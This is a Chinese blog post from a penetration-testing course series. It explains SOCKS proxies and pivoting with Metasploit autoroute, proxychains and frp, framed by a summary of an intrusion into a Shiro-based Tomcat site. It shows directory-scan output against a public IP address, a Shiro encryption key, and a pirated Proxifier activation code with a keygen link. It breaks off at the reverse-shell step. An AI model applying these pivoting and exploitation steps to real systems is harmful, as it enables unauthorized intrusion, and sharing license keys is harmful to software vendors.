<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>0x26 - Socks代理实战 | 晚上十一点睡觉のBlog</title><meta name="author" content="晚上十一点睡觉"><meta name="copyright" content="晚上十一点睡觉"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="l  首先进行了信息收集，在扫目录的时候发现了一些敏感目录，访问其中一个目录的时候，登录发现了shiro组件及其漏洞（在burp挂了被动扫描，burp上安装了shiroscan组件，扫描到访问的网页的时候发现了shiro漏洞） l  然后使用shiro漏洞利用工具，反弹shell到VPS，然后本地起"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://gungnir.top/posts/64585"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?60a7a67c81784f02b889a11753e4e8cc";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":150,"languages":{"author":"作者: 晚上十一点睡觉","link":"链接: ","source":"来源: 晚上十一点睡觉のBlog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '0x26 - Socks代理实战',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-28 03:04:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308761.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">晚上十一点睡觉のBlog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">0x26 - Socks代理实战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-20T18:48:01.000Z" title="发表于 2022-09-21 02:48:01">2022-09-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-27T19:04:54.261Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/">内网</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">内网代理隧道搭建</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>31分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="0x26 - Socks代理实战"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/64585#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>l  首先进行了信息收集，在扫目录的时候发现了一些敏感目录，访问其中一个目录的时候，登录发现了shiro组件及其漏洞（在burp挂了被动扫描，burp上安装了shiroscan组件，扫描到访问的网页的时候发现了shiro漏洞）</p>
<p>l  然后使用shiro漏洞利用工具，反弹shell到VPS，然后本地起一个临时的python的web服务器，在目标机器上wget下载冰蝎的一句话木马，拿下了VPS；也尝试了用shiro工具在网站种注入蚁剑的内存shell，用蚁剑连接，也拿到了shell</p>
<p>l  拿到目标机器后，ipconfig发现该web服务器下面还存在其他网段，用fscan扫他发现其他存活主机。开始搭建frp代理：自己VPS上搭建frp服务端frps，在拿到shell的服务器上上传frp工具及搭建frpc，连接服务端。搭建好socks5代理后，在自己VPS上上通过proxychains，使用nmap内网网段中的主机，发现21 和3306 端口开启，应该是ftp和mysql服务，尝试查找漏洞，利用海德拉爆破弱口令，拿到mysql</p>
<h1 id="Socks代理简介"><a href="#Socks代理简介" class="headerlink" title="Socks代理简介"></a>Socks代理简介</h1><h2 id="什么是代理"><a href="#什么是代理" class="headerlink" title="什么是代理"></a>什么是代理</h2><p>我们正常的HTTP通信是这样的：</p>
<blockquote>
<p>1.客户端先通过TCP与服务器建立一条连接&amp;#x20;</p>
<p>2.连接建立完成后，客户端向服务器发送请求（比如GET &#x2F;hello.html HTTP&#x2F;1.1，意为我想要取得服务器根目录&#x2F;下的hello.html文件）&amp;#x20;</p>
<p>3. 服务器接收到客户端发来的请求，找到所请求的文件，并通过原来的连接发回去。（接上条的例子，找到根目录&#x2F;下的hello.html文件，并发送HTTP&#x2F;1.1 200 OK，代表找到了这个文件，现在我就发送给你）&amp;#x20;</p>
<p>4. 客户端接收到服务器传过来的文件，并用浏览器渲染出来给用户看（通过html&#x2F;css以及js等把传回来的文本内容可视化，展示在屏幕上）</p>
</blockquote>
<p>而我们通过代理服务器A进行HTTP通信则是这样的：</p>
<blockquote>
<p>1.客户端先与A建立TCP连接，然后告诉代理服务器A我想要访问某某网址根目录下的hello.html&amp;#x20;</p>
<p>2. 代理服务器A收到客户端请求，再建立一条到服务端的TCP连接，把这个请求通过这个连接转发到服务端。&amp;#x20;</p>
<p>3. 这样在服务器看来，就好像是客户端请求了&#x2F;hello.html一样，然后把所请求的内容返回回去，代理服务器再把内容通过与客户端的连接送回客户端</p>
</blockquote>
<p>代理服务器A作为一个中间人，负责转发客户端请求消息以及服务端响应消息</p>
<h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>正向代理（Forward Proxy）：是一个位于客户端和原始服务器（origin server）之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端必须设置正向代理服务器，当然前提是要知道正向代理服务器的 IP 地址，还有代理程序的端口。</p>
<ul>
<li>隐藏访问者的行踪</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210153405.png" alt="image-20220921015328233"></p>
<ul>
<li>访问无法访问的服务器B</li>
</ul>
<p>比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到能够访问谷歌的代理服务器，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210153001.png" alt="image-20220921015342837"></p>
<h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>反向代理（Reverse Proxy）：正好与正向代理相反，对于客户端而言代理服务器就像是原始服务器，并且客户端不需要进行任何特别的设置。客户端向反向代理的命名空间中的内容发送普通请求，接着反向代理将判断向何处（原始服务器）转交请求，并将获得的内容返回给客户端。实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p>
<ul>
<li>保护和隐藏原始资源服务器</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210155093.png" alt="image-20220921015507026"></p>
<p>正向代理代理客户端，反向代理代理服务器。</p>
<h2 id="透明代理"><a href="#透明代理" class="headerlink" title="透明代理"></a>透明代理</h2><p>透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的请求报文，并会传送真实IP。</p>
<p>透明代理实例，很多公司使用的行为管理软件</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210155801.png" alt="image-20220921015554604"></p>
<p>客户端 A 和客户端 B 并不知道行为管理设备充当透明代理行为，当用户 A 或用户 B向服务器 A 或服务器 B 提交请求的时候，透明代理设备根据自身策略拦截并修改用户 A 或 B 的报文，并作为实际的请求方，向服务器 A 或 B 发送请求，当接收信息回传，透明代理再根据自身的设置把允许的报文发回至用户 A 或 B，如上图，如果透明代理设置不允许访问服务器 B，那么用户 A 或者用户 B 就不会得到服务器 B 的数据。</p>
<blockquote>
<p>参考：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://laravelacademy.org/post/9336">https://laravelacademy.org/post/9336</a></p>
</blockquote>
<h2 id="什么是Socks"><a href="#什么是Socks" class="headerlink" title="什么是Socks"></a>什么是Socks</h2><p>SOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。</p>
<p>根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间。</p>
<p>使用TCP协议传输数据，因而不提供如传递 ICMP 信息之类的网络层网关服务。</p>
<p>注意是使用传输层TCP传输数据！！</p>
<blockquote>
<p>osi参考模型：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/qishui/p/5428938.html">https://www.cnblogs.com/qishui/p/5428938.html</a></p>
</blockquote>
<p>现今大多组织的网络架构，利用网络防火墙将组织内部的网络结构与外部网络如Internet 有效地隔离开来。这些防火墙系统通常以应用层网关的形式工作在网络之间，提供受控的 TELNET、FTP、SMTP等的接入。</p>
<p>而SOCKS则提供一个通用框架来使这些协议安全透明地穿过防火墙。</p>
<h2 id="什么是socks代理"><a href="#什么是socks代理" class="headerlink" title="什么是socks代理"></a>什么是socks代理</h2><p>1.被代理端与 代理服务器通过 SOCKS4&#x2F;5 代理协议进行通讯；</p>
<p>2.SOCKS4：是对HTTP代理协议的加强，它不仅代理HTTP协议，而是对所有向外的连接进行代理，没有协议限制；</p>
<p>3. SOCKS4a：SOCKS 4协议的简单扩展，允许客户端对无法解析域名的目的主机进行访问</p>
<p>4. SOCKS5：SOCKS5比SOCKS4a多了身份验证、IPv6、UDP支持。创建与SOCKS5服务器的TCP连接后客户端需要先发送请求来确认协议版本及认证方式</p>
<h2 id="我们为什么使用socks5代理"><a href="#我们为什么使用socks5代理" class="headerlink" title="我们为什么使用socks5代理"></a>我们为什么使用socks5代理</h2><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://xie.infoq.cn/article/5d83129a66afc11ffc3c92f12">https://xie.infoq.cn/article/5d83129a66afc11ffc3c92f12</a></p>
</blockquote>
<h2 id="使用Socks代理"><a href="#使用Socks代理" class="headerlink" title="使用Socks代理"></a>使用Socks代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SOCKS服务器的IP地址</span><br><span class="line">SOCKS服务所在端口</span><br><span class="line">SOCKS服务是否需要身份验证</span><br></pre></td></tr></table></figure>

<h2 id="Socks代理与VPN区别"><a href="#Socks代理与VPN区别" class="headerlink" title="Socks代理与VPN区别"></a>Socks代理与VPN区别</h2><p>VPN主要用于从外网访问企业、公司的内部网络，原理是先登录到VPN防火墙、服务器，得到权限，在进入内网。这个过程，用户一直是以自己的身份进行的。而Socks5是一种代理，也就是先所有的交互数据都先经过另一台主机（网卡），这个过程中用户访问其他网络是都是使用的代理服务提供者的身份。</p>
<ul>
<li>张三在外出差想访问公司内网服务器</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210157332.png" alt="image-20220921015752169"></p>
<h2 id="Socks代理工具"><a href="#Socks代理工具" class="headerlink" title="Socks代理工具"></a>Socks代理工具</h2><h3 id="EarthWorm（用的少了，容易被杀，但很经典）"><a href="#EarthWorm（用的少了，容易被杀，但很经典）" class="headerlink" title="EarthWorm（用的少了，容易被杀，但很经典）"></a>EarthWorm（用的少了，容易被杀，但很经典）</h3><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
</blockquote>
<p>EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210158675.png" alt="image-20220921015814427"></p>
<h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
</blockquote>
<p>frp 是一个可用于内网穿透的高性能的反向代理应用</p>
<h3 id="ProxyChains（linux代理软件、kali内置"><a href="#ProxyChains（linux代理软件、kali内置" class="headerlink" title="ProxyChains（linux代理软件、kali内置)"></a>ProxyChains（linux代理软件、kali内置)</h3><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://proxychains.sourceforge.net/">http://proxychains.sourceforge.net/</a></p>
</blockquote>
<p>关于ProxyChains工具：</p>
<ul>
<li>它是一个代理工具。</li>
<li>最新版本：3.1</li>
<li>专用OS：Linux和其他Unices。</li>
<li>允许TCP和DNS通过代理隧道。</li>
<li>支持HTTP、SOCKS4和SOCKS5代理服务器。</li>
<li>不同的代理类型可以混合在同一链中。</li>
<li>代理链：用户定义的代理链列表。</li>
</ul>
<p>可用性：</p>
<ul>
<li>通过代理服务器运行任何程序。</li>
<li>从限制性防火墙后面访问互联网。</li>
<li>隐藏你的IP</li>
<li>通过代理服务器运行SSH、telnet、wget、ftp、apt、vnc、nmap。</li>
<li>从外部通过反向代理访问内联网(192.168..&#x2F;10..)。</li>
</ul>
<h3 id="Proxifier（老师用的多）"><a href="#Proxifier（老师用的多）" class="headerlink" title="Proxifier（老师用的多）"></a>Proxifier（老师用的多）</h3><blockquote>
<ul>
<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.proxifier.com/">https://www.proxifier.com/</a></p>
</li>
<li><p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.cnblogs.com/nul1/p/13952992.html">Proxifier使用教程 </a></p>
</li>
<li><p>激活</p>
</li>
</ul>
<blockquote>
<p>mac v3激活码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3CWNN-WYTP4-SD83W-ASDFR-84KEA</span><br></pre></td></tr></table></figure>

<p>windows 激活码生成工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/Danz17/Proxifier-Keygen</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<h3 id="Others"><a href="#Others" class="headerlink" title="-Others"></a>-Others</h3><blockquote>
<ul>
<li><p>reDuh：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/sensepost/reDuh">https://github.com/sensepost/reDuh</a></p>
</li>
<li><p>reGeorg（RGP）：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/sensepost/reGeorg">https://github.com/sensepost/reGeorg</a></p>
</li>
<li><p>sSocks：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://sourceforge.net/projects/ssocks/">https://sourceforge.net/projects/ssocks/</a></p>
</li>
<li><p>SocksCap64（Windows）：<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.sockscap64.com/">http://www.sockscap64.com</a></p>
</li>
</ul>
</blockquote>
<h1 id="Socks代理实战一-MSF"><a href="#Socks代理实战一-MSF" class="headerlink" title="Socks代理实战一(MSF)"></a>Socks代理实战一(MSF)</h1><p>使用已经msf搭建好的socks代理模块</p>
<p>注意msf使用socks5代理不稳定！</p>
<p>原理讲解：其他具体操作往下看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、首先我们的目标是proxychains curl http://192.168.2.242，访问192.168.2.242数据包，通过proxychains代理了这个请求！那我们代理服务器在哪呢？————在配置文件中配置的VPS ip+端口</span><br><span class="line">由于我是在VPS上的msf开启了socks5代理，所以ip填本地127.0.0.1，端口填1080</span><br><span class="line">也就是修改proxychains配置文件，设定其走的代理:</span><br><span class="line">        vim /etc/proxychains.conf</span><br><span class="line">        注释掉socks4那一行，加上：</span><br><span class="line">        socks5 127.0.0.1 1080</span><br><span class="line">2、数据通过proxychains走到了我们msf开启的socks5代理，那么socks5该怎么配置，才能让其访问到内网的主机呢！？这也是灵魂所在 socks5代理端 怎么配置</span><br><span class="line">数据包通过1080端口到了我们的msf socks 此时它该何去何从？</span><br><span class="line">需要先了解什么是路由：</span><br><span class="line">“路由是指路由器从一个接口上收到数据包，根据数据包的目的地址进行定向并转发到另一个接口的过程。”</span><br><span class="line">我们需要先配置msf的路由，这样子 数据包才会知道该往哪里转发</span><br><span class="line">3、msf路由怎么配置呢？</span><br><span class="line">可以在session2 我们拿到的目标内网第一台外网target1的meterpreter里面执行(当然了也可以在msf中执行添加路由的操作)：</span><br><span class="line">run autoroute -s 192.168.2.0/24    </span><br><span class="line">添加 192.168.2  网段的路由</span><br><span class="line">run autoroute -p    </span><br><span class="line">查看添加的路由</span><br><span class="line">Active Routing Table====================   </span><br><span class="line">Subnet             Netmask            Gateway   ------             -------            -------   </span><br><span class="line">192.168.2.0        255.255.255.0      Session 2</span><br><span class="line">默认的在这个路由表中，只会有10.30.1.255的路由，我们手动添加了192.168.2.0的路由（目标机器两个网卡）我们可以看到在子网192.168.2.0的数据会从网关session 2转发处理，这也是一系列的关键所在。</span><br><span class="line">将信息添加到路由后，数据到达msf socks服务器之后，查询路由表，就会知道往网关session 2转发数据包</span><br><span class="line">4、数据到达session 2后，也急速通过我们的shell meterpreter发送往target1。到了target1该如何走呢？</span><br><span class="line">通过target 1当作一个路由器，将我们的数据转发到target 2，原本上target 1与target 2就是通的。</span><br><span class="line">在物理层，会根据路由向对应mac地址的机器发送数据</span><br></pre></td></tr></table></figure>

<p>附：另一种run autoroute命令 添加msf路由方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看shell网络环境：</span><br><span class="line">meterpreter&gt;run get_local_subnets</span><br><span class="line">添加一条通向目标服务器内网的路由</span><br><span class="line">meterpreter&gt;run autoroute -s 100.0.0.0/8   #(根据目标内网网络而定)</span><br><span class="line">查看路由设置：</span><br><span class="line">meterpreter&gt;run autoroute –p</span><br><span class="line">一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以background返回msf&gt;，查看下外面的路由情况。</span><br><span class="line">route print</span><br><span class="line">如果发现没有路由信息，说明meterpreter shell设置的路由并没有生效，我们可以在msf中添加路由。</span><br><span class="line">msf&gt;route add 10.0.0.0 255.0.0.0 1</span><br><span class="line">说明：1表示session 1，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是session1，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</span><br></pre></td></tr></table></figure>



<h2 id="渗透场景介绍"><a href="#渗透场景介绍" class="headerlink" title="渗透场景介绍"></a>渗透场景介绍</h2><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210200297.png" alt="image-20220921020045065"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先碰到一个网站 要去思考怎么入侵</p>
<p>收集到信息</p>
<p>从web类漏洞：xss、sql注入、文件上传、代码执行、逻辑漏洞、反序列化等等等</p>
<p>从中间件漏洞</p>
<p>从源码漏洞</p>
<p>从系统层漏洞</p>
<p>从数据库漏洞</p>
<p>从哪方面入手，要尝试，要积累经验，要思考</p>
<p>比如说 <a target="_blank" rel="noopener external nofollow noreferrer" href="http://218.76.8.99:38080/">http://218.76.8.99:38080/</a>这台机器就是一个apache tomcat 8.5.0的版本，可以去搜索有没有历史漏洞</p>
<p>前提还是要收集够足够多的信息</p>
<h3 id="探测敏感目录"><a href="#探测敏感目录" class="headerlink" title="-探测敏感目录"></a>-探测敏感目录</h3><p>扫描后发现如下路径和文件可以访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://218.76.8.99:38080/</span><br><span class="line">---- Scanning URL: http://218.76.8.99:38080/ ----</span><br><span class="line">+ http://218.76.8.99:38080/docs (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/examples (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/favicon.ico (CODE:200|SIZE:21630)</span><br><span class="line">+ http://218.76.8.99:38080/host-manager (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/manager (CODE:302|SIZE:0)</span><br><span class="line">+ http://218.76.8.99:38080/sh (CODE:302|SIZE:0)</span><br></pre></td></tr></table></figure>

<h3 id="页面分析"><a href="#页面分析" class="headerlink" title="-页面分析"></a>-页面分析</h3><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://218.76.8.99:38080/sh/">http://218.76.8.99:38080/sh/</a></p>
</blockquote>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210201431.png" alt="image-20220921020154228"></p>
<p>发现 apache shiro组件，得到默认页面，判断shiro是否能利用</p>
<p>并得到key： kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210202963.png" alt="image-20220921020205748"></p>
<blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/fupinglee/ShiroScan/releases">https://github.com/fupinglee/ShiroScan/releases</a></p>
</blockquote>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210202233.png" alt="image-20220921020231017"></p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210245769.png" alt="image-20220921020236023"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/feihong-cs/ShiroExploit-Deprecated">https://github.com/feihong-cs/ShiroExploit-Deprecated</a></p>
<p>这个工具简便操作直接反弹shell好像有点问题，建议还是手动输入反弹shell的命令，后来试了，都可以拿到shell</p>
</blockquote>
<ul>
<li>执行命令</li>
</ul>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209210203954.png" alt="image-20220921020335774"></p>
<ul>
<li>反弹shell</li>
</ul>
